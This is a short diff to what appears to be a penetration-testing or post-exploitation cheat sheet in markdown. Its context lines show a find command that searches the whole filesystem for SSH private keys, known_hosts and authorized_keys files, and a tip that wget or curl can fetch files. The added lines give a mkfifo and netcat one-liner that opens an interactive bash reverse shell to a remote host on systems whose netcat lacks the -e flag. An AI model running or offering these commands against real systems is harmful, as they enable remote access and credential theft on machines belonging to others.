@@ -72,3 +72,7 @@ find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "au
 ## To download something from the internet or from intranet:-
 
 Can do a wget or curl
+
+## To get a netcat shell in bsd if -e flag is missing
+
+mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ip port > /tmp/f
